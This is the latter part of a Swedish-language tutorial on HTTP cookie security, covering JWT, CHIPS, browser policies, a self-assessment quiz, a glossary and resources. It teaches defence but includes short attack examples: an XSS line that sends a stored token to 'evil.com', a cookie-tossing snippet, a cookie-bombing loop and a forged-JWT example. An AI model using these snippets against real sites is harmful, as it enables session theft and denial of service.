  'SECRET_KEY',                         // Signing key
  { expiresIn: '1h' }                  // Expiration
);

// JWT structure:
// header.payload.signature
// eyJhbGc...  .eyJ1c2VySWQ...  .SflKxwRJS...

// 3. Server skickar JWT (olika strategier)

// Strategy A: LocalStorage (common but risky)
res.json({ token });
localStorage.setItem('token', token);

// Strategy B: Cookie (recommended)
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// Strategy C: Authorization header (APIs)
// Client stores in memory, sends:
// Authorization: Bearer eyJhbGc...

// 4. Varje request inkluderar JWT
GET /api/profile
Authorization: Bearer eyJhbGc...

// 5. Server verifierar JWT (NO DATABASE LOOKUP!)
const decoded = jwt.verify(token, 'SECRET_KEY');
// decoded = { userId: 'alice', role: 'admin', exp: 1234567890 }
```

**JWT Anatomy:**

```javascript
// HEADER (Base64URL encoded)
{
  "alg": "HS256",    // Signing algorithm
  "typ": "JWT"       // Token type
}

// PAYLOAD (Base64URL encoded)
{
  "userId": "alice",
  "role": "admin",
  "iat": 1700000000,  // Issued At
  "exp": 1700003600   // Expiration (1h later)
}

// SIGNATURE (HMAC-SHA256)
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)

// Final JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAzNjAwfQ.signature_here
```

**Fördelar:**

✅ **Stateless** – Ingen DB lookup, perfekt för microservices
✅ **Scalable** – Server behöver inte hålla state
✅ **Cross-domain** – Kan användas överallt (APIs, SPAs, mobile)
✅ **Self-contained** – All info i token

**Nackdelar:**

❌ **Cannot revoke** – Token giltigt tills expiration
❌ **Token size** – 200-1000+ bytes (vs sessionId = 32 bytes)
❌ **XSS vulnerability** (if stored in LocalStorage)
❌ **Secret key management** – Om key läcker = disaster

**Security Risks:**

```javascript
// ❌ DANGER: LocalStorage + XSS
localStorage.setItem('token', jwtToken);
// XSS attack:
<script>
  fetch('https://evil.com?token=' + localStorage.getItem('token'));
</script>
// → Attacker får JWT, kan impersonate user!

// ✅ BETTER: HttpOnly Cookie
res.cookie('token', jwtToken, {
  httpOnly: true,   // JavaScript kan inte läsa
  secure: true,     // Endast HTTPS
  sameSite: 'strict' // CSRF-skydd
});

// Men... du kan fortfarande inte revoke!
// Solution: Short expiration + refresh tokens
```

**Best Use Cases:**

- Microservices architecture
- Mobile apps (native iOS/Android)
- Single Page Applications (SPAs)
- APIs med många consumers
- När scalability > instant revocation

---

### 5.6 Sammanfattning: Cookie Expert 2025

Grattis! Du har nu nått expertnivå inom HTTP cookies.

**Du har lärt dig:**

✅ **Privacy Sandbox historia** – Uppgång och fall
✅ **CHIPS (Partitioned Cookies)** – Framtiden för legitimate third-party cookies
✅ **Browser-kriget** – Safari ITP, Firefox ETP, Chrome's U-turn
✅ **RFC-standarder** – 6265bis och Layered Cookies draft
✅ **Cookies vs alternativ** – JWT, sessions, OAuth/OIDC
✅ **Modern cookie landscape 2024-2025**

**Key Takeaways 2025:**

```
┌─────────────────────────────────────────────────────────┐
│  THE COOKIE LANDSCAPE 2025                              │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Third-party cookies:                                   │
│   • Chrome: Alive (user choice)                         │
│   • Safari: Dead since 2017 (ITP)                       │
│   • Firefox: Dead since 2019 (ETP)                      │
│                                                         │
│  Best practice: Assume they're blocked                  │
│                                                         │
│  Solutions:                                             │
│   • First-party cookies (preferred)                     │
│   • CHIPS for legitimate third-party needs              │
│   • Server-side sessions                                │
│   • JWT tokens (with caution)                           │
│                                                         │
│  Security essentials:                                   │
│   • HttpOnly (default ON)                               │
│   • Secure (HTTPS only)                                 │
│   • SameSite=Strict/Lax (context-dependent)             │
│   • __Host- prefix (max security)                       │
│   • Short expiration + refresh pattern                  │
│                                                         │
│  Watch for 2026+:                                       │
│   • Layered Cookies RFC (if adopted)                    │
│   • Further browser fragmentation                       │
│   • New privacy regulations                             │
│   • Alternative state management solutions              │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

**Nya termer (Nivå 5):**

- **CHIPS (Cookies Having Independent Partitioned State)** – Partitioned cookies per top-level site
- **ITP (Intelligent Tracking Prevention)** – Safari's anti-tracking tech
- **ETP (Enhanced Tracking Protection)** – Firefox's anti-tracking tech
- **Privacy Sandbox** – Google's failed initiative att ersätta third-party cookies
- **RFC 6265bis** – Uppdaterad cookie standard (2025)
- **Layered Cookies** – Proposed future cookie architecture
- **Schemeful Same-Site** – HTTP vs HTTPS treated as cross-site
- **Cookie Eviction** – How browsers remove cookies when jar is full
- **Partitioned** cookie attribute – För CHIPS
- **CMA (Competition and Markets Authority)** – UK regulator som påverkade Googles beslut
- **Topics API** – Deprecated Privacy Sandbox API för interest-based ads
- **FedCM (Federated Credential Management)** – Överlevande Privacy Sandbox API för identity
- **JWT (JSON Web Token)** – Stateless authentication token
- **Access Token** – Short-lived token för API access
- **Refresh Token** – Long-lived token för att få nya access tokens
- **Total Cookie Protection** – Firefox's cookie isolation feature

**🎯 Expert-Level Best Practices:**

```javascript
// 1. ALWAYS use HttpOnly for session cookies
res.cookie('session', sessionId, {
  httpOnly: true,    // ✅ XSS protection
  secure: true,      // ✅ HTTPS only
  sameSite: 'strict' // ✅ CSRF protection
});

// 2. Use __Host- prefix for critical cookies
res.cookie('__Host-session', sessionId, {
  httpOnly: true,
  secure: true,
  path: '/',
  // NO Domain attribute!
});

// 3. Implement refresh token pattern for JWTs
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, secret, { expiresIn: '7d' });

// 4. Feature-detect CHIPS support
if (supportsPartitioned) {
  document.cookie = 'data=xyz; Partitioned; Secure; SameSite=None';
} else {
  // Fallback to server-side session
}

// 5. Monitor cookie sizes
if (document.cookie.length > 4096) {
  console.warn('Cookie header exceeds 4KB - risk of truncation!');
}

// 6. Set appropriate expirations
// Session cookie: No Expires/Max-Age
// Remember me: Max-Age=30 days
// Never: Max-Age > 1 year (consider if necessary)

// 7. Validate all cookie attributes server-side
function validateCookie(cookie) {
  assert(cookie.httpOnly === true, 'Must be HttpOnly');
  assert(cookie.secure === true, 'Must be Secure');
  assert(['strict', 'lax'].includes(cookie.sameSite), 'Must have SameSite');
}

// 8. Log cookie operations for audit
logger.info('Cookie set', {
  name: cookieName,
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  userId: user.id,
  timestamp: new Date()
});
```

**Övning för dig:** Sätt upp ett testprojekt med:

1. First-party session cookies med Redis
2. JWT access + refresh token pattern
3. CHIPS-enabled third-party widget (om möjligt)
4. Full security headers (CSP, HSTS, etc.)
5. Automated tests för alla flows
6. Cross-browser testing (Chrome, Safari, Firefox)

**Next Steps:**

Du är nu redo att designa och implementera production-grade authentication systems! Fortsätt hålla dig uppdaterad:

- Följ IETF HTTPbis working group
- Läs browser release notes (Chrome, Safari, Firefox)
- Studera security advisories (OWASP, CVE)
- Delta i security communities (r/netsec, HackerOne, etc.)

Och framför allt: **Test everything. Trust no input. Defense in depth.**

---
---

## Slutlig Självutvärdering 🎓

Nu när du har läst hela guiden (från 5-åring till expert) är det dags att testa dina kunskaper! Detta är en omfattande självutvärdering som täcker allt från grundläggande koncept till avancerade säkerhetsimplementationer.

### Quiz: Nivå 1-2 (Grundläggande förståelse)

**Fråga 1:** Vad är en cookie i enklaste termer?
<details>
<summary>Svar</summary>
En liten textfil som webbplatser sparar i din webbläsare för att "komma ihåg" dig mellan besök.
</details>

**Fråga 2:** Vad är skillnaden mellan en session cookie och en persistent cookie?
<details>
<summary>Svar</summary>
- **Session cookie:** Raderas när du stänger webbläsaren
- **Persistent cookie:** Stannar kvar tills ett specifikt utgångsdatum (kan vara dagar, månader eller år)
</details>

**Fråga 3:** Vad är skillnaden mellan first-party och third-party cookies?
<details>
<summary>Svar</summary>
- **First-party:** Satt av webbplatsen du besöker (t.ex. shop.com sätter cookie från shop.com)
- **Third-party:** Satt av en annan webbplats (t.ex. shop.com inkluderar ads.com som sätter en cookie)
</details>

**Fråga 4:** Vilken cookie-typ används vanligtvis för reklam-tracking?
<details>
<summary>Svar</summary>
Third-party cookies (därför blockerar Safari och Firefox dem by default)
</details>

---

### Quiz: Nivå 3 (Teknisk förståelse)

**Fråga 5:** Vilket HTTP-header används för att SÄTTA en cookie?
<details>
<summary>Svar</summary>
`Set-Cookie` (från server till browser)
</details>

**Fråga 6:** Vilket HTTP-header används för att SKICKA cookies till servern?
<details>
<summary>Svar</summary>
`Cookie` (från browser till server)
</details>

**Fråga 7:** Vad gör `HttpOnly` attributet?
<details>
<summary>Svar</summary>
Förhindrar JavaScript från att läsa cookien (skydd mot XSS-attacker)
</details>

**Fråga 8:** Vad gör `Secure` attributet?
<details>
<summary>Svar</summary>
Säkerställer att cookien endast skickas över HTTPS (krypterad anslutning)
</details>

**Fråga 9:** Vilka tre värden kan `SameSite` ha?
<details>
<summary>Svar</summary>
1. `Strict` - Aldrig skickas cross-site
2. `Lax` - Skickas vid top-level navigation (default)
3. `None` - Alltid skickas (kräver `Secure`)
</details>

**Fråga 10:** Vad är skillnaden mellan `Expires` och `Max-Age`?
<details>
<summary>Svar</summary>
- `Expires`: Absolut datum/tid (t.ex. "Wed, 21 Oct 2025 07:28:00 GMT")
- `Max-Age`: Relativt antal sekunder från nu (t.ex. 3600 = 1 timme)
- `Max-Age` har högre prioritet om båda finns
</details>

**Fråga 11:** Vad händer om du sätter `Domain=example.com`?
<details>
<summary>Svar</summary>
Cookien blir tillgänglig för example.com OCH alla subdomäner (api.example.com, shop.example.com, etc.)
</details>

**Fråga 12:** Hur sätter du en cookie som varar i 7 dagar?
<details>
<summary>Svar</summary>
```http
Set-Cookie: name=value; Max-Age=604800
```
(7 dagar × 24 timmar × 60 minuter × 60 sekunder = 604800 sekunder)
</details>

---

### Quiz: Nivå 4 (Säkerhet)

**Fråga 13:** Vilka TRE säkerhetsattacker kan riktas mot cookies?
<details>
<summary>Svar</summary>
1. **XSS (Cross-Site Scripting)** - Stjäla cookies via skadlig JavaScript
2. **CSRF (Cross-Site Request Forgery)** - Lura browser att göra requests med offrets cookies
3. **Session Hijacking** - Stjäla eller gissa session-IDs
</details>

**Fråga 14:** Hur skyddar du mot XSS cookie theft?
<details>
<summary>Svar</summary>
1. Sätt `HttpOnly` på alla session cookies
2. Escape/sanitize all user input
3. Implementera Content Security Policy (CSP)
4. Använd ett modernt framework som escaper by default
</details>

**Fråga 15:** Hur skyddar du mot CSRF?
<details>
<summary>Svar</summary>
1. Använd `SameSite=Strict` eller `SameSite=Lax`
2. Implementera CSRF tokens för state-changing requests
3. Verifiera `Origin` och `Referer` headers
4. Kräv re-authentication för kritiska actions
</details>

**Fråga 16:** Vad är Session Fixation och hur förhindrar du det?
<details>
<summary>Svar</summary>
**Session Fixation:** Attacker fixerar ett session-ID innan offret loggar in, sedan "tar över" sessionen efter login.

**Förhindra:**
- Regenerera session-ID vid login
- Regenerera vid privilege escalation
- Acceptera ALDRIG session-ID från URL-parametrar
</details>

**Fråga 17:** Varför bör session-IDs vara minst 128 bitar?
<details>
<summary>Svar</summary>
För att förhindra brute-force attacks. Med 128 bitar finns det 2^128 möjliga kombinationer (340 undecillion), vilket är praktiskt omöjligt att gissa.
</details>

**Fråga 18:** Vad är skillnaden mellan `__Secure-` och `__Host-` prefixes?
<details>
<summary>Svar</summary>
**`__Secure-`:**
- Måste ha `Secure` attribute
- Kan ha `Domain` och `Path`

**`__Host-`:**
- Måste ha `Secure` attribute
- Måste ha `Path=/`
- Får INTE ha `Domain` attribute (binder till exact host)
- Starkare skydd mot subdomain attacks
</details>

**Fråga 19:** Vad är Cookie Tossing?
<details>
<summary>Svar</summary>
En attack där en subdomain (eller attacker som kontrollerar en subdomain) sätter en cookie som overridar parent domain's cookie.

**Exempel:**
```javascript
// På evil.example.com:
document.cookie = "session=HACKED; Domain=example.com; Path=/";

// När user besöker example.com används den falska cookien!
```

**Skydd:** Använd `__Host-` prefix (ingen Domain attribute tillåten)
</details>

**Fråga 20:** Vilket är det MINSTA säkra cookie-konfigurationen för en session cookie?
<details>
<summary>Svar</summary>
```http
Set-Cookie: __Host-session=VALUE;
            Secure;
            HttpOnly;
            SameSite=Strict;
            Path=/
```

Detta ger:
- ✅ Skydd mot XSS (`HttpOnly`)
- ✅ Skydd mot CSRF (`SameSite=Strict`)
- ✅ Skydd mot MitM (`Secure`)
- ✅ Skydd mot subdomain attacks (`__Host-` + no `Domain`)
</details>

---

### Quiz: Nivå 5 (Expert)

**Fråga 21:** Vad hände med Google Privacy Sandbox 2024-2025?
<details>
<summary>Svar</summary>
- Juli 2024: Google backade från att helt eliminera third-party cookies
- Introducerade istället "user choice" model
- Oktober 2025: De flesta Privacy Sandbox APIs depreceras (Topics, FLEDGE, Attribution Reporting)
- Överlevare: CHIPS, FedCM, Private State Tokens
</details>

**Fråga 22:** Vad är CHIPS och hur fungerar det?
<details>
<summary>Svar</summary>
**CHIPS** (Cookies Having Independent Partitioned State) = Partitioned cookies

Cookien är separerad per top-level site:
```
example.com embeds widget.com → Cookie A
shop.com embeds widget.com → Cookie B (different!)
```

Förhindrar cross-site tracking men tillåter legitimate third-party use cases (chat widgets, payment providers, etc.)

**Användning:**
```http
Set-Cookie: session=abc; Partitioned; Secure; SameSite=None; Path=/
```
</details>

**Fråga 23:** Vilka browsers blockerar third-party cookies 2025?
<details>
<summary>Svar</summary>
- **Safari:** Totalt blockerade sedan 2017 (ITP)
- **Firefox:** Blockerar known trackers sedan 2019 (ETP), user kan välja "Strict" för total blockering
- **Chrome:** Tillåter by default, user kan välja att blockera (stor U-turn 2024)
</details>

**Fråga 24:** Vad är RFC 6265bis?
<details>
<summary>Svar</summary>
Den uppdaterade HTTP cookie-standarden (draft-20 publicerad mars 2025):

**Nytt:**
- Officiellt standardiserat `SameSite`
- Formaliserat `__Secure-` och `__Host-` prefixes
- Schemeful Same-Site (http vs https = cross-site)
- Tydligare cookie eviction rules
- Förbättrad third-party cookie definition
- Klargjorda storleksgränser (4096 bytes per cookie, 50-180 per domain)
</details>

**Fråga 25:** När ska du använda JWT istället för session cookies?
<details>
<summary>Svar</summary>
**Använd JWT när:**
- Microservices architecture (stateless fördelaktigt)
- Mobile apps (native iOS/Android)
- Cross-domain APIs
- Behöver skala horisontellt utan shared state
- Acceptabelt att inte kunna revoke tokens instantly

**Använd Session Cookies när:**
- Traditional web apps (monolith)
- High-security apps där instant revocation krävs (bank, healthcare)
- Behöver full server-side kontroll
- Vill minimera cookie size (32 bytes vs 200-1000+ bytes)
</details>

**Fråga 26:** Vad är farligt med `jwt.decode()` istället för `jwt.verify()`?
<details>
<summary>Svar</summary>
**KRITISKT SÄKERHETSHÅL:**

```javascript
// ❌ DANGER
const decoded = jwt.decode(token); // Verifierar INTE signature!

// Attacker kan skapa fake token:
const fakeToken = base64(header) + '.' + base64({admin: true}) + '.fake';
// Server accepterar den! → Full admin access

// ✅ CORRECT
const decoded = jwt.verify(token, SECRET_KEY); // Verifierar signature
```

**jwt.decode()** läser bara token utan att verifiera att den är äkta. Attacker kan skapa vilken token som helst!
</details>

**Fråga 27:** Hur implementerar du refresh token pattern säkert?
<details>
<summary>Svar</summary>
```javascript
// 1. Short-lived access token (15 min)
const accessToken = jwt.sign(payload, SECRET, { expiresIn: '15m' });

// 2. Long-lived refresh token (7 days) - lagras i DB
const refreshToken = crypto.randomUUID();
await db.refreshTokens.insert({
  token: refreshToken,
  userId: user.id,
  expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000
});

// 3. Båda i HttpOnly cookies
res.cookie('accessToken', accessToken, { httpOnly: true, maxAge: 15*60*1000 });
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  path: '/api/refresh',  // Endast skickas till refresh endpoint!
  maxAge: 7*24*60*60*1000
});

// 4. När access token expirerar:
// POST /api/refresh med refresh token
// Validera i DB, issue ny access token

// 5. Logout = Delete refresh token från DB
```

**Fördelar:**
- XSS-skydd (HttpOnly)
- Revocable (refresh token i DB)
- Short-lived access tokens (begränsar skada om stulen)
</details>

**Fråga 28:** Vad är Schemeful Same-Site och varför är det viktigt?
<details>
<summary>Svar</summary>
**Schemeful Same-Site:** HTTP och HTTPS behandlas som CROSS-site även om domänen är samma.

```javascript
// Gammalt beteende:
http://example.com + https://example.com = Same-Site ✅

// RFC 6265bis (Schemeful):
http://example.com + https://example.com = Cross-Site ❌
```

**Varför viktigt:**
Förhindrar downgrade attacks där attacker serves HTTP-version av site och försöker stjäla HTTPS cookies.
</details>

**Fråga 29:** Designa en säker multi-region session architecture.
<details>
<summary>Svar</summary>
```
Architecture:

┌─── GeoDNS (routes to nearest region)
│
├─── US Region
│    ├─ Load Balancer
│    ├─ App Servers (3+)
│    └─ Redis Cluster (US sessions)
│
├─── EU Region (GDPR compliance)
│    ├─ Load Balancer
│    ├─ App Servers (3+)
│    └─ Redis Cluster (EU sessions)
│
└─── Asia Region
     ├─ Load Balancer
     ├─ App Servers (3+)
     └─ Redis Cluster (Asia sessions)

Key features:
- Sessions lagras i närmaste region (low latency)
- Cross-region fallback (availability)
- EU users data STAYS in EU (GDPR)
- Session replication för disaster recovery
- Region hint cookie för routing
```
</details>

**Fråga 30:** Vad är Cookie Bombing och hur försvarar du mot det?
<details>
<summary>Svar</summary>
**Cookie Bombing:** DOS-attack genom att sätta hundratals stora cookies:

```javascript
// Attacker:
for (let i = 0; i < 100; i++) {
  document.cookie = `bomb${i}=${'X'.repeat(4000)}; Domain=.target.com`;
}

// Result: Request header > 400 KB
// Server limit: 8-16 KB
// → 431 Request Header Too Large → Site DOS:ad!
```

**Försvar:**
1. **Application-level:** Validate cookie header size
   ```javascript
   if (req.headers.cookie?.length > 4096) {
     return res.status(400).send('Cookie header too large');
   }
   ```

2. **Limit cookie count:**
   ```javascript
   const cookieCount = (req.headers.cookie?.match(/;/g) || []).length + 1;
   if (cookieCount > 20) {
     return res.status(400).send('Too many cookies');
   }
   ```

3. **CDN/WAF filtering:** Cloudflare, AWS WAF, etc.

4. **Rate limiting:** Max cookies per IP per time period
</details>

---

### Slutpoäng och Nivåer

Räkna dina rätt:

- **0-10 rätt:** Grundläggande (Nivå 1-2) - Läs om Nivå 3-5
- **11-20 rätt:** Kompetent (Nivå 3) - Bra förståelse, fördjupa säkerhet
- **21-25 rätt:** Avancerad (Nivå 4) - Solid säkerhetskunskap
- **26-30 rätt:** Expert (Nivå 5) - Du behärskar HTTP cookies fullständigt! 🏆

---

## Ordlista 📖

### A-C

**Absolute Timeout**
Maximal total session-längd oavsett aktivitet. Exempel: Session måste förnyas efter 24 timmar även om användaren är aktiv.

**Access Token**
Kort-livat token (typiskt 15-60 min) som ger access till resurser. Används ofta tillsammans med refresh tokens.

**Attribute (Cookie)**
En inställning på en cookie som styr dess beteende. Exempel: `HttpOnly`, `Secure`, `SameSite`, `Domain`, `Path`, `Expires`, `Max-Age`.

**Authentication**
Processen att verifiera vem någon är (användarnamn + lösenord, biometrics, etc.).

**Authorization**
Processen att avgöra vad någon får göra (roller, permissions).

**CHIPS (Cookies Having Independent Partitioned State)**
Modern cookie-teknologi som partitionerar third-party cookies per top-level site för att förhindra tracking samtidigt som legitimate use cases tillåts.

**CIA Triad**
Tre grundpelare inom informationssäkerhet:
- **Confidentiality** (Konfidentialitet) - Endast auktoriserade kan läsa
- **Integrity** (Integritet) - Data inte modifierad
- **Availability** (Tillgänglighet) - System är tillgängliga när behövs

**CMA (Competition and Markets Authority)**
Storbritanniens konkurrensmyndighet som spelade nyckelroll i att stoppa Googles cookie phase-out 2024.

**Cookie**
Liten textfil (max 4096 bytes) som lagras i webbläsaren och skickas med varje HTTP-request till servern.

**Cookie Bombing**
DOS-attack där attacker sätter hundratals stora cookies för att överskrida request header-gränser.

**Cookie Jar**
Webbläsarens lagring av alla cookies, organiserat per domain.

**Cookie Tossing**
Attack där subdomain sätter cookie med `Domain=` attribute för att överskriva parent domain's cookie.

**CORS (Cross-Origin Resource Sharing)**
Säkerhetsmekanism som kontrollerar vilka origins som får göra cross-origin requests.

**CSPRNG (Cryptographically Secure Pseudorandom Number Generator)**
Slumptalsgenerator säker nog för kryptografiska ändamål (session-IDs, tokens, etc.).

**CSRF (Cross-Site Request Forgery)**
Attack där skadlig site lurar offrets browser att göra requests till en annan site där offret är inloggad.

**CSRF Token**
Unikt, hemligt token inkluderat i forms för att verifiera att requesten kommer från legitimate source.

**CSP (Content Security Policy)**
HTTP-header som begränsar vilka resurser (scripts, styles, images) som får laddas/köras.

### D-H

**Defense-in-Depth**
Säkerhetsstrategi med flera lager av försvar så att om ett lager bryts finns andra kvar.

**Domain Attribute**
Cookie-attribute som specificerar vilka domains cookien ska skickas till. `Domain=example.com` = alla subdomäner inkluderade.

**ETP (Enhanced Tracking Protection)**
Firefox's anti-tracking teknologi som blockerar cookies från kända trackers.

**Expires Attribute**
Cookie-attribute som anger absolut datum/tid när cookien ska raderas. Exempel: `Expires=Wed, 21 Oct 2025 07:28:00 GMT`

**FedCM (Federated Credential Management)**
Privacy Sandbox API (överlevare) för federated identity management.

**First-Party Cookie**
Cookie satt av den webbplats användaren besöker. Exempel: `shop.com` sätter cookie från `shop.com`.

**HSTS (HTTP Strict Transport Security)**
HTTP-header som tvingar webbläsaren att alltid använda HTTPS för en domain.

**HttpOnly Attribute**
Cookie-attribute som förhindrar JavaScript från att läsa cookien. Kritiskt för session cookies (XSS-skydd).

### I-P

**Idle Timeout**
Session timeout som aktiveras efter en period av inaktivitet.

**ITP (Intelligent Tracking Prevention)**
Safaris anti-tracking teknologi som blockerar third-party cookies och begränsar first-party tracking cookies.

**JWT (JSON Web Token)**
Självständigt token-format (header.payload.signature) för stateless authentication.

**Layered Cookies**
Proposed RFC (draft 2025) för att separera cookies i explicit layers (Auth, Pref, Analytics, Ads).

**Max-Age Attribute**
Cookie-attribute som anger relativt antal sekunder cookien ska leva. Exempel: `Max-Age=3600` (1 timme).

**OAuth 2.0**
Authorization framework för att ge third-party apps access till resurser utan att dela credentials.

**OIDC (OpenID Connect)**
Authentication layer ovanpå OAuth 2.0 som ger identity tokens (JWT).

**Origin**
Kombination av scheme + host + port. Exempel: `https://example.com:443`

**OWASP (Open Web Application Security Project)**
Nonprofit organisation fokuserad på web application security. Publicerar "OWASP Top 10" lista över vanligaste säkerhetshot.

**Partitioned Attribute**
Cookie-attribute för CHIPS. Gör cookien partitioned per top-level site.

**Path Attribute**
Cookie-attribute som begränsar cookien till specifika URL-paths. Exempel: `Path=/admin` = endast skickas till /admin/*

**Persistent Cookie**
Cookie med `Expires` eller `Max-Age` som överlever browser-omstart.

**PKCE (Proof Key for Code Exchange)**
OAuth 2.0 extension för att säkra authorization code flow (viktigt för SPAs och mobile apps).

**Privacy Sandbox**
Googles (mestadels misslyckade) initiativ att ersätta third-party cookies med privacy-preserving APIs.

### R-Z

**Refresh Token**
Långlivat token (dagar/veckor) som används för att få nya access tokens utan re-authentication.

**RFC 6265**
Den ursprungliga HTTP cookie standarden från 2011.

**RFC 6265bis**
Uppdaterad cookie standard (draft-20 mars 2025) med SameSite, cookie prefixes, schemeful same-site, etc.

**SameSite Attribute**
Cookie-attribute som kontrollerar när cookien skickas i cross-site requests:
- `Strict` = Aldrig cross-site
- `Lax` = Endast top-level navigation (default)
- `None` = Alltid (kräver `Secure`)

**Schemeful Same-Site**
Modern definition där HTTP och HTTPS behandlas som cross-site även om domain är samma.

**Secure Attribute**
Cookie-attribute som säkerställer att cookien endast skickas över HTTPS.

**Session Cookie**
Cookie utan `Expires` eller `Max-Age` som raderas när webbläsaren stängs.

**Session Fixation**
Attack där attacker fixerar ett session-ID innan offret loggar in, sedan "tar över" efter login.

**Session Hijacking**
Generell term för att stjäla/överta någons session (sniffing, XSS, fixation, etc.).

**Session Sniffing**
Avlyssna nätverkstrafik för att stjäla session cookies (fungerar på HTTP men inte HTTPS).

**SSO (Single Sign-On)**
System där en login ger access till flera relaterade system.

**Third-Party Cookie**
Cookie satt av en annan domain än den användaren besöker. Exempel: `shop.com` inkluderar `ads.com` som sätter cookie.

**Token Handler Pattern**
Säkerhetsmönster för OAuth där backend hanterar tokens och använder HttpOnly cookies mot frontend.

**Total Cookie Protection**
Firefox feature som isolerar cookies per top-level site (liknande CHIPS).

**XSS (Cross-Site Scripting)**
Attack där skadlig JavaScript injekteras och körs på offrets browser. Tre typer: Reflected, Stored, DOM-based.

**__Host- Prefix**
Cookie name prefix som kräver: `Secure`, `Path=/`, INGEN `Domain`. Starkaste skyddet.

**__Secure- Prefix**
Cookie name prefix som kräver `Secure` attribute.

---

## Resurser för Fördjupning 📚

### Officiella Specifikationer & Standarder

**RFC Standards:**
- [RFC 6265](https://datatracker.ietf.org/doc/html/rfc6265) - HTTP State Management Mechanism (2011)
- [RFC 6265bis (draft)](https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html) - Uppdaterad cookie spec
- [Layered Cookies (draft)](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-layered-cookies) - Proposed future architecture

**W3C & WHATWG:**
- [HTML Living Standard - Cookies](https://html.spec.whatwg.org/multipage/webappapis.html#cookies)
- [Fetch Standard - Credentials](https://fetch.spec.whatwg.org/#credentials)

**IETF Working Groups:**
- [HTTPbis Working Group](https://httpwg.org/) - HTTP protocol development
- [HTTPbis Mailing List](https://lists.w3.org/Archives/Public/ietf-http-wg/)

### Säkerhet & Best Practices

**OWASP:**
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Cross-Site Scripting (XSS) Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

**Mozilla Developer Network (MDN):**
- [HTTP Cookies Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Set-Cookie Header Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [Cookie Store API](https://developer.mozilla.org/en-US/docs/Web/API/Cookie_Store_API)

**Google Developers:**
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)
- [CHIPS (Partitioned Cookies)](https://developers.google.com/privacy-sandbox/cookies/chips)
- [Cookie Security Guidelines](https://web.dev/secure/)

### Privacy & Browser Policies

**Safari/WebKit:**
- [Intelligent Tracking Prevention (ITP)](https://webkit.org/tracking-prevention/)
- [WebKit Privacy Policy](https://webkit.org/tracking-prevention-policy/)

**Firefox:**
- [Enhanced Tracking Protection (ETP)](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop)
- [Total Cookie Protection](https://blog.mozilla.org/en/products/firefox/firefox-rolls-out-total-cookie-protection-by-default-to-all-users-worldwide/)

**Chrome:**
- [Privacy Sandbox Status](https://privacysandbox.com/open-web/)
- [Third-Party Cookie Phase-out Timeline](https://developers.google.com/privacy-sandbox/cookies/prepare)

### Tools & Testing

**Browser DevTools:**
- Chrome DevTools → Application → Cookies
- Firefox Developer Tools → Storage → Cookies
- Safari Web Inspector → Storage → Cookies

**Online Tools:**
- [JWT.io](https://jwt.io/) - JWT debugger & encoder
- [Cookie Scanner](https://www.cookiemetrix.com/) - Analyze cookies on websites
- [SecurityHeaders.com](https://securityheaders.com/) - Check security headers

**Libraries & Frameworks:**

*Node.js:*
- [cookie](https://www.npmjs.com/package/cookie) - Cookie parsing and serialization
- [cookie-parser](https://www.npmjs.com/package/cookie-parser) - Express middleware
- [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) - JWT implementation
- [express-session](https://www.npmjs.com/package/express-session) - Session middleware

*Python:*
- [Flask Sessions](https://flask.palletsprojects.com/en/stable/api/#sessions)
- [Django Cookies](https://docs.djangoproject.com/en/stable/ref/request-response/#django.http.HttpRequest.COOKIES)

*PHP:*
- [setcookie()](https://www.php.net/manual/en/function.setcookie.php)
- [Laravel Sessions](https://laravel.com/docs/session)

### Böcker

- **"Web Application Security" by Andrew Hoffman** - Comprehensive security guide
- **"Identity and Data Security for Web Development" by Jonathan LeBlanc** - OAuth, OpenID Connect, cookies
- **"HTTP: The Definitive Guide" by David Gourley** - Deep dive into HTTP protocol

### Podcasts & YouTube

- **Darknet Diaries** - Security stories (episoder om web attacks)
- **Security Now** - Steve Gibson's weekly security podcast
- **OWASP Podcast Series** - Application security topics

**YouTube Channels:**
- [LiveOverflow](https://www.youtube.com/@LiveOverflow) - Hacking & security
- [Hussein Nasser](https://www.youtube.com/@hnasr) - Backend engineering & security
- [Web Dev Simplified](https://www.youtube.com/@WebDevSimplified) - Modern web development

### Conferences & Communities

**Conferences:**
- OWASP Global AppSec
- Black Hat USA/Europe/Asia
- DEF CON
- RSA Conference

**Online Communities:**
- [r/netsec](https://reddit.com/r/netsec) - Network security
- [r/websecurity](https://reddit.com/r/websecurity) - Web application security
- [HackerOne Hacktivity](https://hackerone.com/hacktivity) - Real disclosed vulnerabilities
- [OWASP Slack](https://owasp.org/slack/invite) - OWASP community

### Security Advisories & CVEs

- [CVE Database](https://cve.mitre.org/) - Common Vulnerabilities and Exposures
- [NVD (National Vulnerability Database)](https://nvd.nist.gov/)
- [Snyk Vulnerability Database](https://security.snyk.io/)

### Fortsatt Lärande

**CTF Platforms (Capture The Flag):**
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [OverTheWire](https://overthewire.org/)
